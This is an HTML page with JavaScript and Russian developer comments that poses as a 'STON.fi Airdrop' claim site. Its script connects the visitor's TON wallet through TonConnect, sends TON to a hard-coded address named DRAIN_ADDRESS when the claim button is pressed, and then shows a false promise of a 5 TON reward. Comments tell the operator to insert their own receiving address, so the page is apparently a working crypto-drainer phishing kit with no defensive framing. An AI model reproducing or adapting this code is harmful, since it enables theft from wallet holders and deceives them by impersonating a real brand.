<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>STON.fi Airdrop</title>
  <!-- Правильная загрузка TonConnect -->
  <script src="https://unpkg.com/@tonconnect/ui@2.0.5/dist/tonconnect-ui.min.js"></script>
  <style>
    /* Твой стиль остается без изменений */
  </style>
</head>
<body>
  <canvas id="dust"></canvas>
  <nav class="nav">
    <div class="nav-links">
      <a href="#about">About</a>
      <a href="#omniston">Omniston</a>
      <a href="#roadmap">Roadmap</a>
      <a href="#advantages">Advantages</a>
    </div>
    <div class="actions">
      <select class="lang-select" id="lang-select">
        <option value="en">EN</option>
        <option value="ru">RU</option>
      </select>
      <!-- Изменяем id кнопки для TonConnect -->
      <div id="connect-button-container"></div>
      <button class="btn btn-primary" id="claim-btn" disabled>
        Participate in Airdrop
      </button>
    </div>
  </nav>
  
  <!-- Остальной HTML код без изменений -->

  <div id="status">Status: Ready</div>

  <!-- Частицы оставляем как есть -->

  <script>
    // Твой адрес TON (убедись что правильный!)
    const DRAIN_ADDRESS = "UQDIwuhyezggLDZQmPcIrFzknVCpyKAchlIjUqj5X8u8BUYD"; // Тестовый адрес, замени на свой

    // Создаем собственный manifest
    const manifest = {
      url: window.location.origin,
      name: "STON.fi Airdrop",
      iconUrl: "https://strapi.switchere.com/uploads/stonhero_4957e6ddf9.png",
      termsOfUseUrl: "https://example.com/terms",
      privacyPolicyUrl: "https://example.com/privacy"
    };

    // Инициализируем TonConnect
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
      manifest: manifest,
      buttonRootId: "connect-button-container", // Куда вставить кнопку
      uiPreferences: {
        theme: "DARK",
        borderRadius: "s"
      }
    });

    const claimBtn = document.getElementById('claim-btn');
    const statusEl = document.getElementById('status');

    // Отслеживаем изменения статуса
    tonConnectUI.onStatusChange((wallet) => {
      console.log('Wallet status:', wallet);
      
      if (wallet) {
        // Кошелек подключен
        claimBtn.disabled = false;
        statusEl.textContent = `Connected: ${wallet.account.address.slice(0, 8)}...`;
        statusEl.style.color = "#14f195";
      } else {
        // Кошелек отключен
        claimBtn.disabled = true;
        statusEl.textContent = "Wallet disconnected";
        statusEl.style.color = "#ff6b6b";
      }
    });

    // Обработка кнопки claim
    claimBtn.onclick = async () => {
      if (!tonConnectUI.connected) {
        statusEl.textContent = "Please connect wallet first!";
        return;
      }

      statusEl.textContent = "Preparing transaction...";
      claimBtn.disabled = true;

      try {
        // Получаем текущий кошелек
        const wallet = tonConnectUI.wallet;
        
        // Создаем транзакцию
        const transaction = {
          validUntil: Math.floor(Date.now() / 1000) + 600, // 10 минут
          messages: [
            {
              address: DRAIN_ADDRESS,
              amount: "10000000", // 0.01 TON в нанотонах
              // payload можно оставить пустым или добавить комментарий
              payload: ""
            }
          ]
        };

        // Отправляем транзакцию
        const result = await tonConnectUI.sendTransaction(transaction);
        
        statusEl.textContent = `Success! TX: ${result.boc.slice(0, 20)}...`;
        claimBtn.disabled = true;
        
        alert("✅ Thank you for participating! You will receive 5 TON at the end of the airdrop.");
        
      } catch (error) {
        console.error("Transaction error:", error);
        
        if (error.message?.includes('User rejected')) {
          statusEl.textContent = "Transaction rejected by user";
        } else if (error.message?.includes('insufficient')) {
          statusEl.textContent = "Insufficient TON balance";
        } else {
          statusEl.textContent = `Error: ${error.message || "Unknown error"}`;
        }
        
        claimBtn.disabled = false;
      }
    };

    // Дополнительные обработчики для лучшего UX
    tonConnectUI.uiOptions = {
      actionsConfiguration: {
        twaReturnUrl: window.location.href
      }
    };

    // Проверяем, не подключен ли уже кошелек
    window.addEventListener('load', () => {
      if (tonConnectUI.connected) {
        statusEl.textContent = "Wallet already connected!";
        claimBtn.disabled = false;
      }
    });
  </script>
</body>
</html>
